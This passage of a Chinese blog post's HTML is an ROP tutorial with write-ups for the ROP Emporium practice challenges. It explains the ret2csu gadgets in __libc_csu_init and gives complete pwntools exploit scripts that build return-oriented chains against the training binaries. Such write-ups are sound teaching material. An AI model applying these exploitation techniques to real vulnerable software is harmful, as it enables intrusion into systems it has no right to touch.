p64(pop_rax_ret) + p64(a1_pointer) + p64(xchg_ret)<br><br><span class="hljs-comment"># 构造调用ret2win函数的ROP链</span><br><span class="hljs-comment"># 需要手动调用foothold_function,这样got表绑定的就是foothold_function函数的真实地址了</span><br><span class="hljs-comment"># 之后根据foothold_function函数与ret2win函数的地址差值就可以找到ret2win函数</span><br>payload2 = p64(foothold_function_plt)<br>payload2 += p64(pop_rax_ret) + p64(foothold_function_got)<br>payload2 += p64(mov_rax2_ret)<br>payload2 += p64(pop_rbp_ret) + p64(offset)<br>payload2 += p64(add_rax_rbp_ret)<br>payload2 += p64(call_rax)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>sh.sendline(payload2)<br>sh.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>sh.sendline(payload1)<br><br>sh.interactive()<br>sh.close()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406152223470.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>类似<code>callme</code>题目，我们所要调用的<code>ret2win</code>函数需要传入3个参数，通过查找<code>pop|ret</code>这样的<code>gadget</code>发现程序中并不存在<code>pop rdx</code>这样的指令，因此第3个参数的传递构造就成了难题。</p>
+<p>官方提示了<code>__libc_csu_init</code>这样的函数，它里面使用到了各种不同的寄存器。我们观察这个函数，可以发现存在如下非常有用的<code>gadget</code>：</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406161505358.png" srcset="/img/loading.gif" lazyload></p>
+<p>假如我们先执行<code>gadget1</code>再执行<code>gadget2</code>，那么就可以通过<code>r13</code>、<code>r14</code>、<code>r15</code>寄存器将第一、二、三个参数传递给<code>edi</code>、<code>rsi</code>、<code>rdx</code>（注意<code>mov edi, r13d</code>会将<code>rdi</code>的高32bits清零）。然后我们又可以通过控制<code>r12</code>和<code>rbx</code>，这样一来就可以通过<code>call</code>指令调用我们想调用的函数了。</p>
+<p>但由于第一个参数是64bits的，显然想通过<code>gadget2</code>中的<code>call</code>指令调用<code>ret2win</code>函数并输出<code>flag</code>是行不通的。因此以上操作只能使第三个参数存储到<code>rdx</code>中，但由于<code>call</code>指令的存在，我们需要寻找合适的函数以确保它所调用的函数不会修改<code>rdx</code>的值。同时，为了使得我们在执行完<code>gadget2</code>后能够继续控制代码流，我们需要控制<code>rbp</code>和<code>rbx</code>的值（通常简单地设置<code>rbp</code>&#x3D;1，<code>rbx</code>&#x3D;0），使其在<code>jnz</code>指令处继续往下执行，最终到达<code>retn</code>指令。</p>
+<p>注意到<code>frame_dummy</code>函数并不会更改<code>rdx</code>的值，因此我们可以让<code>[r12+rbx*8]</code>指向该函数（注意是<code>r12+rbx*8</code>对应地址里的值为函数地址）。</p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406161611459.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406161611115.png" srcset="/img/loading.gif" lazyload></p>
+<p>经过以上分析，我们构造出最终的ROP链如下所示：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">低地址<br><span class="hljs-code">+------------------------------------------------+</span>                            <br><span class="hljs-section">|                 40bytes填充字符                 |    </span><br><span class="hljs-section">+------------------------------------------------+</span><br>|                 gadget1所在地址                 |   <br><span class="hljs-code">+------------------------------------------------+</span>                                         <br>|                     0(rbx)                     |                                      <br><span class="hljs-code">+------------------------------------------------+</span>                                        <br><span class="hljs-section">|                     1(rbp)                     |                                  </span><br><span class="hljs-section">+------------------------------------------------+</span><br><span class="hljs-section">|        存储frame_dummy函数地址的地址(r12)         |  (即0x600DF0处的__frame_dummy_init_array_entry)  </span><br><span class="hljs-section">+------------------------------------------------+</span><br>|                     0(r13)                     |  <br><span class="hljs-code">+------------------------------------------------+</span>                                         <br>|                     0(r14)                     |                                       <br><span class="hljs-code">+------------------------------------------------+</span>                                        <br><span class="hljs-section">|                 第三个参数的值(r15)              |                                   </span><br><span class="hljs-section">+------------------------------------------------+</span><br>|                 gadget2所在地址                 |   <br><span class="hljs-code">+------------------------------------------------+</span> <br>| 8bytes填充字符(add rsp,8)+48bytes填充字符(5个pop) |   <br><span class="hljs-code">+------------------------------------------------+</span> <br><span class="hljs-section">|                 pop rdi;ret;指令地址            |                                   </span><br><span class="hljs-section">+------------------------------------------------+</span><br>|                    第一个参数的值                |    <br><span class="hljs-code">+------------------------------------------------+</span> <br><span class="hljs-section">|             pop rsi;pop r15;ret;指令地址        |                                   </span><br><span class="hljs-section">+------------------------------------------------+</span><br><span class="hljs-section">|                    第二个参数的值                |</span><br><span class="hljs-section">+------------------------------------------------+</span><br><span class="hljs-section">|                    8bytes填充字符               |</span><br><span class="hljs-section">+------------------------------------------------+</span><br>|                call _ret2win指令地址            |<br>高地址 <br></code></pre></td></tr></table></figure>
+
+
+
+<p>最终脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./ret2csu&quot;</span>)<br><span class="hljs-comment">#sh = gdb.debug(&quot;./ret2csu&quot;, &quot;break *(pwnme+152)&quot;)</span><br><br>ret_addr = <span class="hljs-number">0x4006A4</span><br>pop_rdi_ret = <span class="hljs-number">0x4006a3</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x4006a1</span><br><br>csu_gadget1 = <span class="hljs-number">0x40069A</span> <span class="hljs-comment"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn;</span><br>csu_gadget2 = <span class="hljs-number">0x400680</span> <span class="hljs-comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call ds:[r12+rbx*8];...</span><br><br>param1 = <span class="hljs-number">0xDEADBEEFDEADBEEF</span><br>param2 = <span class="hljs-number">0xCAFEBABECAFEBABE</span><br>param3 = <span class="hljs-number">0xD00DF00DD00DF00D</span><br>call_ret2win_addr = <span class="hljs-number">0x40062a</span> <span class="hljs-comment"># 使用call ret2win指令不需要进行栈对齐</span><br>ret2win_plt_addr = <span class="hljs-number">0x400510</span> <span class="hljs-comment"># 通过.plt表调用ret2win函数需要进行栈对齐</span><br><br>frame_dummy_addr = <span class="hljs-number">0x600df0</span><br><br><span class="hljs-comment"># 让rdx存储第三个参数的值</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">32</span> + <span class="hljs-number">8</span>)<br>payload += p64(csu_gadget1) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(frame_dummy_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(param3)<br>payload += p64(csu_gadget2)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span><br>payload += <span class="hljs-number">6</span> * p64(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># 第一、二参数存储到rdi、rsi中</span><br>payload += p64(pop_rdi_ret) + p64(param1)<br>payload += p64(pop_rsi_r15_ret) + p64(param2) + p64(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># 调用ret2win</span><br>payload += p64(call_ret2win_addr)<br><span class="hljs-comment"># or</span><br><span class="hljs-comment"># payload += p64(ret_addr) + p64(ret2win_plt_addr)</span><br><br>sh.sendline(payload)<br>sh.interactive()<br>sh.close()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gal2xy/blog_img/main/img/202406161158023.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://ropemporium.com/index.html">ROP Emporium</a></p>
+<p><a target="_blank" rel="noopener" href="https://ropemporium.com/guide.html">Beginners’ guide (ropemporium.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget: This tool lets you search your gadgets on your binaries to facilitate your ROP exploitation. ROPgadget supports ELF, PE and Mach-O format on x86, x64, ARM, ARM64, PowerPC, SPARC, MIPS, RISC-V 64, and RISC-V Compressed architectures. (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.xuenixiang.com/thread-3317-1-1.html">求助，做pwn题ciscn_2019_c_1时栈平衡的问题</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zheng__Huang/article/details/119484353">PLT &amp; GOT 表动态链接详解及 pwn 应用_.got.plt 的序号-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">28479-return-oriented-programming-(rop-ftw).pdf (exploit-db.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf (blackhat.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Reverse/" class="category-chain-item">Reverse</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ROP/">#ROP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ROP入门</div>
+      <div>http://example.com/2024/06/16/PWN/ROP入门/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>gla2xy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月16日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/11/%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/angr%E8%AE%BA%E6%96%87/" title="阅读笔记 —— 《Offensive Techniques in Binary Analysis》">
+                        <span class="hidden-mobile">阅读笔记 —— 《Offensive Techniques in Binary Analysis》</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
